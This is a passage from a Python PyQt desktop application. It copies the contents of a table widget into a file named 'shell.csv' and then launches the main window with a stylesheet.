            for j in range(0, self.Ui.tableWidget.columnCount()):   #循环列
                if self.Ui.tableWidget.item(i,j)!=None:     #有数据
                    data.append(self.Ui.tableWidget.item(i,j).text()) #空格分隔
            comdata.append(list(data))
            data=[]
        # print(comdata)
        with open('shell.csv', 'w', newline='') as f:
            writer = csv.writer(f)
            for row in comdata:
                writer.writerow(row)
        f.close()
if __name__ == "__main__":
    app = QtWidgets.QApplication(sys.argv)
    window = MainWindows()
    styleFile = './qss/1.qss'
    qssStyle = Common.readQss(styleFile)
    window.setStyleSheet(qssStyle)
    window.show()
    sys.exit(app.exec_())


